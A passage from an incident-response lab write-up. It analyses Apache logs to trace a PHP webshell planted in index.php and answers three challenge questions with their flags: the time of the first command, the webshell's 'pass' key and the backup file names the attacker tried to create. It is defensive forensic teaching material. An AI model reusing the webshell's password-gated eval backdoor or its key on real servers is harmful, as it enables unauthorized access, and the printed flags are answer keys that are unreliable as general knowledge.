/var/log/apache2/access.log.1:44.207.251.118 - - [12/Apr/2024:08:54:56 +0000] "POST /index.php HTTP/1.1" 200 74372 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
/var/log/apache2/access.log.1:44.207.251.118 - - [12/Apr/2024:09:05:02 +0000] "POST /index.php HTTP/1.1" 200 2465 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
{% endhighlight %}

Most of the objects are similar in size, but one is approximately 30 times as big as the others. We can assume that this was the first command executed.

{% include cd_flag.html id="8" description="In order to accurately log and analyze the sequence of unauthorized activities, when was the first command executed by the attacker through the persistence mechanism?" flag="2024-04-12 08:54:56" %}

### Q9. Understanding the means of unauthorized access is vital - what key did the attacker use to gain entry through the persistence mechanism deployed?

If we circle back to Q6, the `index.php` contains a check for a `pass` value in `POST` with the value of `696d29e0940a4957748fe3fc9efd22a3`. This can be easily searched online and will give us the answer.

{% include cd_flag.html id="9" description="Understanding the means of unauthorized access is vital - what key did the attacker use to gain entry through the persistence mechanism deployed?" flag="password" %}

### Q10. Part of ensuring full remediation involves understanding the attacker’s fallback strategies - what is the first new file name the threat actor attempted to create as a backup measure to maintain their foothold?

If we poke around on the filesystem, we can check multiple files for this activity - but considering the need for a webshell to execute code, it's likely related to activities logged in Apache. 

Checking Apaches error log shows the two file names the attacker attempted.

{% highlight terminal %}
oot@ip-172-31-33-25:~# tail -n 10 /var/log/apache2/error.log.1 
[Fri Apr 12 08:53:04.756632 2024] [php:error] [pid 13503] [client 3.226.44.180:44430] PHP Parse error:  Unclosed '{' on line 11 in /var/www/html/index.php on line 13
[Fri Apr 12 09:05:02.206181 2024] [php:error] [pid 9240] [client 44.207.251.118:41562] PHP Parse error:  syntax error, unexpected end of file in /var/www/html/index.php(13) : eval()'d code on line 1
[Fri Apr 12 09:11:25.698888 2024] [php:error] [pid 14578] [client 44.207.251.118:52798] PHP Parse error:  syntax error, unexpected character 0x1E in /var/www/html/index.php(13) : eval()'d code on line 1
[Fri Apr 12 09:11:51.070247 2024] [php:error] [pid 13247] [client 44.207.251.118:38106] PHP Parse error:  Unclosed '{' in /var/www/html/index.php(13) : eval()'d code on line 1
[Fri Apr 12 09:13:39.578000 2024] [php:error] [pid 14578] [client 44.207.251.118:36246] PHP Parse error:  Unclosed '{' in /var/www/html/index.php(13) : eval()'d code on line 1
[Fri Apr 12 09:14:00.766964 2024] [php:error] [pid 9237] [client 44.207.251.118:60786] PHP Parse error:  Unclosed '{' in /var/www/html/index.php(13) : eval()'d code on line 1
cat: /tmp/.xz: No such file or directory
cp: cannot create regular file 'index_backup.php': Permission denied
cp: cannot create regular file 'backup.php': Permission denied
[Fri Apr 12 09:32:35.503344 2024] [mpm_prefork:notice] [pid 9234] AH00170: caught SIGWINCH, shutting down gracefully
{% endhighlight %}

{% include cd_flag.html id="10" description="Part of ensuring full remediation involves understanding the attacker’s fallback strategies - what is the first new file name the threat actor attempted to create as a backup measure to maintain their foothold?" flag="index_backup.php" %}